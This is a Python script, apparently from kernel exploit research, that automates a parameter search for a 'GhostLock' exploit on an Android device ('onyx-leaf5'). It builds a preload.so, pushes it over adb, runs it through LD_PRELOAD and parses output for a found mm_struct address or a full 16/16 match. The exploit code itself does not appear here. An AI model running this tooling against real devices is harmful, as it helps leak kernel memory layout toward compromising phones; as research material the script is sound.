#!/usr/bin/env python3
"""
Search kernel parameters for GhostLock bruteforce.
Iterates FUTEX_HASHSIZE × KS_MM_ORDER, runs exploit via adb,
stops when best_match==16/16 or mm_struct is found.

Usage:
  uv run leaf5-search-params
  uv run leaf5-search-params --timeout 120
  uv run leaf5-search-params --resume search_results.json
"""

import subprocess, sys, json, re, time, os
from datetime import datetime
from pathlib import Path

REPO_ROOT   = Path(__file__).resolve().parent.parent.parent
EXPLOIT_DIR = REPO_ROOT / "exploit"
PRELOAD_SO  = EXPLOIT_DIR / "preload.so"
DEVICE_PATH = "/data/local/tmp/preload.so"
RESULTS_FILE = Path.cwd() / "search_results.json"

FUTEX_HASHSIZES = [256, 512, 1024, 2048, 4096, 8192] #, 16384, 32768, 65536, 131072]
MM_ORDERS       = [2, 3, 4]
MM_STRUCT_SZS   = [0x388]


def run(cmd, timeout=10, capture=True):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=capture,
                           text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"


def adb_push():
    if not PRELOAD_SO.exists():
        print(f"✗ {PRELOAD_SO} missing; build first")
        return False
    ret, _, err = run(f"adb push {PRELOAD_SO} {DEVICE_PATH}")
    return ret == 0


def adb_shell(cmd, timeout=180):
    return run(f"adb shell '{cmd}'", timeout=timeout)


def check_device():
    ret, out, _ = run("adb shell echo alive", timeout=5)
    return ret == 0 and "alive" in out


def wait_device():
    print("  Waiting for device...", end="", flush=True)
    for _ in range(60):
        time.sleep(2)
        if check_device():
            print(" OK")
            return True
        print(".", end="", flush=True)
    print(" FAILED")
    return False


def parse_output(stdout):
    r = {"best_match": None, "best_total": 16, "futex_hashsize": None,
         "found_mm": False, "pile_up": False, "collisions": 0,
         "retry": 0, "page_base": None}
    for line in stdout.splitlines():
        m = re.search(r"DIAG:\s+best match (\d+)/(\d+)", line)
        if m: r["best_match"], r["best_total"] = int(m.group(1)), int(m.group(2))
        m = re.search(r"futex_init:.*hashsize=(\d+)", line)
        if m: r["futex_hashsize"] = int(m.group(1))
        if "found mm_struct" in line or "page_base=" in line: r["found_mm"] = True
        m = re.search(r"page_base=([0-9a-fA-Fx]+)", line)
        if m: r["page_base"] = m.group(1); r["found_mm"] = True
        if "pile-up verified" in line: r["pile_up"] = True
        m = re.search(r"found (\d+) collis", line)
        if m: r["collisions"] = int(m.group(1))
        m = re.search(r"retry (\d+)/(\d+)", line)
        if m: r["retry"] = int(m.group(1))
    return r


def is_success(r):
    if r["found_mm"]: return True
    if r["best_match"] and r["best_match"] == r["best_total"]: return True
    return False


def build():
    print("Building exploit via Docker...")
    script = EXPLOIT_DIR / "docker-build.sh"
    ret, _, err = run(
        f"bash {script} TARGET_DIR=targets/onyx-leaf5",
        timeout=300, capture=False)
    if ret != 0:
        print(f"Build failed (exit={ret})")
        return False
    if not PRELOAD_SO.exists():
        print(f"Build did not produce {PRELOAD_SO}")
        return False
    print(f"  Built: {PRELOAD_SO} ({PRELOAD_SO.stat().st_size} bytes)")
    return True


def run_one(combo, idx, total, timeout):
    env = f"FUTEX_HASHSIZE={combo['hs']} KS_MM_ORDER={combo['order']}"
    print(f"\n[{idx}/{total}] {env}  (mm_sz=0x{combo['mm_sz']:x})")

    t0 = time.time()
    cmd = f"{env} LD_PRELOAD={DEVICE_PATH} /system/bin/ls /dev/null"
    ret, stdout, stderr = adb_shell(cmd, timeout=timeout)
    elapsed = time.time() - t0

    for line in stdout.splitlines():
        if any(kw in line for kw in ["DIAG:", "futex_init:", "found mm", "page_base",
                                       "best match", "collisions", "pile-up", "retry",
                                       "setup_kernelsnitch", "KernelSnitch", "heap_spray"]):
            print(f"  | {line.strip()}")
    if stderr:
        for line in stderr.splitlines()[:3]:
            print(f"  ! {line.strip()}")

    result = parse_output(stdout)
    best = f"{result['best_match']}/{result['best_total']}" if result["best_match"] else "?"
    status = "★★★ FOUND ★★★" if is_success(result) else \
             f"collisions={result['collisions']}" if result["pile_up"] else "?"
    print(f"  → best={best}  {status}  {elapsed:.0f}s")
    return result, elapsed


def save_results(results, path):
    with open(path, "w") as f:
        json.dump(results, f, indent=2, default=str)


def load_results(path):
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return []


def main():
    import argparse
    p = argparse.ArgumentParser(description="Search GhostLock kernel parameters")
    p.add_argument("--timeout", type=int, default=180)
    p.add_argument("--resume", type=str)
    p.add_argument("--no-build", action="store_true")
    args = p.parse_args()

    if not args.no_build and not build():
        sys.exit(1)
    if not adb_push():
        sys.exit(1)
    if not check_device():
        print("✗ Device not reachable")
        sys.exit(1)

    combos = [{"hs": hs, "order": o, "mm_sz": s}
              for hs in FUTEX_HASHSIZES for o in MM_ORDERS for s in MM_STRUCT_SZS]

    completed = []
    if args.resume:
        completed = load_results(args.resume)
        done_keys = {(r["combo"]["hs"], r["combo"]["order"], r["combo"]["mm_sz"])
                     for r in completed}
        combos = [c for c in combos
                  if (c["hs"], c["order"], c["mm_sz"]) not in done_keys]
        print(f"Resuming: {len(completed)} done, {len(combos)} remaining")

    total = len(combos)
    print(f"\nSearch space: {total} combos, timeout={args.timeout}s per attempt")
    print(f"{'='*70}")

    results = list(completed)
    for idx, combo in enumerate(combos):
        ci = len(completed) + idx + 1
        result, elapsed = run_one(combo, ci, len(completed) + total, args.timeout)
        results.append({"combo": combo, "result": result,
                        "elapsed": elapsed, "time": datetime.now().isoformat()})
        save_results(results, RESULTS_FILE)

        if is_success(result):
            print(f"\n★★★ SUCCESS at combo #{ci} ★★★")
            print(f"  FUTEX_HASHSIZE={combo['hs']}  KS_MM_ORDER={combo['order']}")
            break

        if not check_device():
            print("  Device gone, waiting...")
            if not wait_device():
                break
            adb_push()

    # Summary
    print("\nTop results (by best_match):")
    for r in sorted(results, key=lambda x: x["result"].get("best_match") or 0, reverse=True)[:10]:
        c = r["combo"]
        bm = r["result"].get("best_match")
        print(f"  best={bm:>2}/{r['result']['best_total']}  "
              f"hashsize={c['hs']:<6} order={c['order']}  0x{c['mm_sz']:x}  {r['elapsed']:.0f}s")

    save_results(results, RESULTS_FILE)
    print(f"\nFull results: {RESULTS_FILE}")


if __name__ == "__main__":
    main()
